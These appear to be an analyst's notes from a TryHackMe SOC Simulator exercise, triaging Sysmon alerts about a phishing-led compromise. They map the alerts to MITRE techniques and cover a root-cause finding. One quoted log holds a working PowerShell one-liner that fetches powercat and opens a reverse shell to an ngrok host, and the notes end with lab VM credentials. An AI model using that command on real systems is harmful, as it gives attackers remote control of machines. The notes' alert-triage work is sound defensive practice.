Gen notes

SIEM notes

1
 datasource: sysmon  
   event.action: Registry value set (rule: RegistryEvent)  
   event.code: 13  
   host.name:  
   process.name: spoolsv.exe  
   process.pid: 3848  
   registry.key: System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{49455221-FA52-47F9-826D-B41CFD35E447}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName  
   registry.path: HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{49455221-FA52-47F9-826D-B41CFD35E447}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName  
   registry.value: FriendlyName  
   timestamp: 03/24/2025 00:44:39.477

regkey changed for spooler, perhaps monitor what spoolsv.exe does after this

2

   datasource: sysmon  
   event.action: Process Create (rule: ProcessCreate)  
   event.code: 1  
   host.name: win-3452  
   process.command_line: C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:8388616 WinX:0 WinY:0 IEFrame:0000000000000000  
   process.name: rundll32.exe  
   process.parent.name: iexplore.exe  
   process.parent.pid: 3769  
   process.pid: 3528  
   process.working_directory: C:\Users\cain.omoore\Desktop\  
   timestamp: 03/24/2025 01:00:22.477

potential lead
same host had this next log where sethc.exe and parent AtBroker.exe 

3

  datasource: sysmon  
   event.action: Process Create (rule: ProcessCreate)  
   event.code: 1  
   host.name: win-3452  
   process.command_line: "C:\Windows\System32\Sethc.exe" /AccessibilitySoundAgent  
   process.name: sethc.exe  
   process.parent.name: AtBroker.exe  
   process.parent.pid: 3919  
   process.pid: 3822  
   process.working_directory: C:\Windows\system32\  
   timestamp: 03/24/2025 00:46:15.477

https://attack.mitre.org/techniques/T1218/
https://attack.mitre.org/techniques/T1546/008/
https://lolbas-project.github.io/lolbas/Binaries/Atbroker/

4
   datasource: sysmon  
   event.action: Process Create (rule: ProcessCreate)  
   event.code: 1  
   host.name: win-3450  
   process.command_line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell"  
   process.name: powershell.exe  
   process.parent.name: explorer.exe  
   process.parent.pid: 3,180  
   process.pid: 3880  
   process.working_directory: C:\Windows\System32\WindowsPowerShell\v1.0\  
   timestamp: 03/24/2025 01:10:57.477

CEO michael ascott is downloading powercat and opening on p19282 this is obvious malicious activity ATP

https://attack.mitre.org/techniques/T1105/

5 TIES TO 4

datasource: sysmon  
   event.action: Process Create (rule: ProcessCreate)  
   event.code: 1  
   host.name: win-3450  
   process.command_line: "C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords  
   process.name: net.exe  
   process.parent.name: powershell.exe  
   process.parent.pid: 3728  
   process.pid: 5784  
   process.working_directory: C:\Users\michael.ascot\downloads\  
   timestamp: 03/24/2025 01:14:03.477

evidence of financial records exfil

RCA:

alert 1007 was an email delivering an attachment ImportantInvoice-Febrary.zip (see forensic machine notes) disguising itself as a PDF

the link in that shortcut executed malicious powershell scripts

Forensic machine notes

linked pdf see SIEM 4


pending escalation / false posneg decision notes



Leads

check leads1
regkey changed for spooler, perhaps monitor what spoolsv.exe does after this


NOTES FOR FUTURE REFERENCE:
-add fields that are good
-next time try to do a run with good MTTRs
-locked out of analyst VM, reopen scenario and check on Analyst VM to test PDF file with link extension behavior
TryHackMe SOC Simulator analyst VM, you'll need the credentials: username `damianhall` and password `Logs321!` TURNS OUT THERE ARE CREDS